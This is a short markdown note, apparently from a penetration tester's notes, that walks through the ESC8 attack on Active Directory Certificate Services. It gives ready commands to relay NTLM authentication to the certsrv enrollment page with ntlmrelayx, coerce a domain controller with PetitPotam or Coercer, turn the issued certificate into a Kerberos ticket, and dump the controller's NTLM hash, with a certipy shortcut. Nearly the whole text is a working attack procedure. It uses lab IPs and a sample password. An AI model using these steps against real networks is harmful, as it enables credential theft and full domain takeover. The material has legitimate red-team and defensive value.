---
title: ESC8
tags:
  - esc
  - adcs
---

### ESC8
This requires NTLMv2 relaying from target identity to the /certsrc/certfnsh.asp endpoint to request a certificate. Below are the steps to reproduce.  In case of successful coerce, relayed NetNTLM can be used to request a certificate as the account itself. 

1. Fire up `ntlmrelayx.py` to listen for incoming hash and relay it to target url
```bash
ntlmrelayx.py -t http://192.168.86.183/certsrv/certfnsh.asp -smb2support --adcs --template 'KerberosAuthentication'
```
2. Coerce authentication using [PetitPotam](https://github.com/topotam/PetitPotam). _Note that patched system doesnt allow unauthenticated coerce, then it would require a credential_
```bash
# unpatched DC
python3 PetitPotam.py 192.168.86.165 192.168.86.182

# patched DC
python3 PetitPotam.py -u 'peter' -p 'Welcome1234' -d 'range.net' 192.168.86.165 192.168.86.182
```
3. A base64 encoded ticket should be retrieved by now and save it in a file. Use gettgtpkinit.py to convert the pfx certificate to ccache format 
```bash
python3 gettgtpkinit.py range.net/dc01\$ -pfx-base64 $(cat /tmp/b64-cert.b64) -dc-ip 192.168.86.182 /tmp/out.ccache
```
4. Use getnthash.py to retrieve ntlm hash
```bash
python3 /opt/AD/PKINITtools/getnthash.py range.net/dc01\$ -key c5deec1a9ef6cbaf6da31cb46c1398fdc47c37630375896ee412f3462332503b -dc-ip 192.168.86.182
```
5. NTLM hash should now be retrieved and win!

Step 1, 3 and 4 can be skipped with **certipy**
1. Use relay module in certipy
```bash
certipy relay -ca ca01.range.net -template 'DomainController'
```
2. Coerce with any coercion methods that you'd prefer.
```bash
py Coercer.py -t 192.168.86.182 -l 192.168.86.193
```
3. Authenticate with the retrieved certificate with certipy's auth module.
```bash
certipy auth -pfx dc01.pfx -dc-ip 192.168.86.183
```

